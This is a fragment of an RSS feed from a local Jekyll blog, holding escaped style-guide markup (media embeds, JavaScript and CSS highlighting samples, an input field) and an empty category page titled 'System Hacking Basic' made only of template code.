&lt;iframe src=&quot;https://player.twitch.tv/?autoplay=false&amp;amp;video=v248755437&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;true&quot; scrolling=&quot;no&quot; height=&quot;378&quot; width=&quot;620&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;soundcloud-embed&quot;&gt;SoundCloud Embed&lt;/h3&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/29738591&amp;amp;color=ff5500&amp;amp;auto_play=false&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;codepen-embed&quot;&gt;CodePen Embed&lt;/h3&gt;

&lt;p data-height=&quot;265&quot; data-theme-id=&quot;light&quot; data-slug-hash=&quot;YWvpRo&quot; data-default-tab=&quot;css,result&quot; data-user=&quot;kharrop&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;Referral Form&quot; class=&quot;codepen&quot;&gt;&lt;/p&gt;
&lt;script async=&quot;&quot; src=&quot;https://production-assets.codepen.io/assets/embed/ei.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;syntax-highlighting&quot;&gt;Syntax Highlighting&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&apos;use strict&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;markdown&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You can add inline code just like this, E.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;.code { color: #fff; }&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#f4f4f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;github-gist-embed&quot;&gt;GitHub gist Embed&lt;/h3&gt;

&lt;script src=&quot;https://gist.github.com/ahmadajmi/dbb4f713317721668bcbc39420562afc.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;input-style&quot;&gt;Input Style&lt;/h3&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; placeholder=&quot;I&apos;m an input field!&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;


</description>
            <link>http://localhost:4000/styleguide/</link>
          </item>
        
      
    
      
        
          <item>
            <title>System Hacking Basic</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.jekyll %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/system-hacking-basic/</link>
          </item>
        
      
    
      
    
      
    
      
    

  </channel>
</rss>